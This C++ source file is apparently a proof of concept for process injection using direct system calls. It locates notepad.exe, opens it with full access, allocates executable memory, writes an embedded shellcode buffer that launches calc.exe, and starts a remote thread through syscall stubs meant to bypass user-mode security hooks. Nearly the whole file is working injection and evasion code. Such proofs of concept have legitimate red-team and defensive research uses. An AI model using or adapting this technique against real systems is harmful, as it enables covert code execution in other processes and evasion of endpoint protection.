/*
* ml64.exe /c direct-syscalls.asm
* cl.exe direct-syscalls-ex.cpp ps-utils.cpp syscall-utils.cpp direct-syscalls.obj /Fe:direct-syscalls.exe
*/
#include <stdio.h>
#include "syscall-utils.h"
#include "ps-utils.h"

extern "C" {
        // https://ntdoc.m417z.com/NtAllocateVirtualMemory
        NTSTATUS SysNtAllocateVirtualMemory(
            HANDLE ProcessHandle,    
            PVOID* BaseAddress,      
            ULONG_PTR ZeroBits,      
            PSIZE_T RegionSize,      
            ULONG AllocationType,    
            ULONG Protect            
        );

        // https://ntdoc.m417z.com/NtWriteVirtualMemory
        NTSTATUS SysNtWriteVirtualMemory(
            HANDLE ProcessHandle,     
            PVOID BaseAddress,        
            PVOID Buffer,             
            SIZE_T NumberOfBytesToWrite, 
            PSIZE_T NumberOfBytesWritten 
        );

        // https://ntdoc.m417z.com/ntcreatethreadex
        NTSTATUS SysNtCreateThreadEx(
            PHANDLE ThreadHandle,        
            ACCESS_MASK DesiredAccess,   
            PVOID ObjectAttributes,      
            HANDLE ProcessHandle,        
            PVOID lpStartAddress,        
            PVOID lpParameter,           
            ULONG Flags,                 
            SIZE_T StackZeroBits,        
            SIZE_T SizeOfStackCommit,    
            SIZE_T SizeOfStackReserve,   
            PVOID lpBytesBuffer          
        );

        // https://ntdoc.m417z.com/NtWaitForSingleObject
        NTSTATUS SysNtWaitForSingleObject(
            HANDLE Handle,          
            BOOLEAN Alertable,      
            PLARGE_INTEGER Timeout  
        );
    }

int main(int argc, char* argv[]) {
    unsigned char buf[] =
        "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00";

    DWORD pid = 0;
    const wchar_t* processName = L"notepad.exe";

    pid = FindPidByName(processName);
    if (pid == 0) {
        printf("[ERROR] Failed to obtain process ID!\n");
        return -1;
    }

    printf("[*] Running PI with target PID: %u\n", pid);

    // Open a handle to the current process, this must be passed to VirtualAllocEx
    HANDLE pHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(pid));
    if (pHandle == NULL) {
        printf("Failed to acquire process handle!\n");
        return -1;
    }

    printf("[*] Successfully opened handle to PID: %u\n", pid);

    PVOID bufferAddress = NULL;
	SIZE_T buffSize = sizeof(buf); 
	//SysNtAllocateVirtualMemory((HANDLE)-1, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
    SysNtAllocateVirtualMemory(pHandle, (PVOID*)&bufferAddress, (ULONG_PTR)0, &buffSize, (ULONG)(MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);

	SIZE_T bytesWritten;
	//SysNtWriteVirtualMemory(GetCurrentProcess(), bufferAddress, buf, sizeof(buf), &bytesWritten);
    SysNtWriteVirtualMemory(pHandle, bufferAddress, buf, sizeof(buf), &bytesWritten);

	HANDLE hThread;	
	//SysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, GetCurrentProcess(), (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);
    SysNtCreateThreadEx(&hThread, GENERIC_EXECUTE, NULL, pHandle, (LPTHREAD_START_ROUTINE)bufferAddress, NULL, FALSE, 0, 0, 0, NULL);
	
	SysNtWaitForSingleObject(hThread, FALSE, NULL);
	getchar();

    return 0;
}